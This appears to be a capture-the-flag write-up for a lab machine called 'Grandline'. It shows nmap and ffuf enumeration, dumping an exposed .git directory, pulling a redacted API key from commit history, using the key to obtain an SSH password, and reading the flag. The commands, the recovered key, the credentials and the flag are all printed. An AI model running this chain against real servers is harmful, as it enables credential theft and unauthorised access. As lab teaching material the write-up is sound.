# Grandline

## Techniques used

- Directory/endpoint fuzzing
- Exposed `.git` directory dump
- Git history secret leak
- API key bypass

## Tools used

- nmap
- curl
- ffuf
- git
- python3 (manual git object extraction)

## Commands and output

### 1. Port scan

```bash
$ nmap -Pn -sV -p- 10.10.0.29
```

```text
22/tcp   open  ssh
8081/tcp open  http    Werkzeug httpd 3.1.8 (Python 3.13.5)
```

### 2. Web enumeration

Directory fuzzing revealed a `/api` route and the `/forgot` page's JS revealed a hidden endpoint:

```text
POST /api/retrieve-d-password/<username>  body: {"key": "..."}
```

### 3. Exposed .git directory

```bash
$ curl -s -o /dev/null -w "%{http_code}" http://10.10.0.29:8081/.git/config
```

```text
200
```

### 4. Dumping the repository


```bash
$ curl -s http://10.10.0.29:8081/.git/refs/heads/master
68222302aec902506af48d9cb7e4cc0398edf470
$ python3 git_dump.py 68222302aec902506af48d9cb7e4cc0398edf470
$ git checkout master -- .
```

### 5. Recovering the redacted API key from git history

```bash
$ git log -p -- app.py
```

```text
commit 0e68fc9 "Redact api key"
-    if(data['key']=='57db5c001c802fc4be25afb02cff9bf8'):
+    if(data['key']=='<YOUR API_KEY>'):
```

### 6. Retrieving credentials via the API

```bash
$ curl -X POST http://10.10.0.29:8081/api/retrieve-d-password/zoro \
    -H "Content-Type: application/json" \
    -d '{"key":"57db5c001c802fc4be25afb02cff9bf8"}'
```

```text
{"username":"zoro","password":"I_G07_L0S7_0Nc3_4G41n"}
```

### 7. SSH login and reading user.txt

```bash
$ ssh zoro@10.10.0.29
Password: I_G07_L0S7_0Nc3_4G41n
$ cat user.txt
```

```text
EPI{1f_1_91V3_uP_noW_1m_9o1N9_7O_r39R37_17}
```

## Evidence

- Leaked API key (git history): `57db5c001c802fc4be25afb02cff9bf8`
- SSH: `zoro` / `I_G07_L0S7_0Nc3_4G41n`
- Flag: `EPI{1f_1_91V3_uP_noW_1m_9o1N9_7O_r39R37_17}`
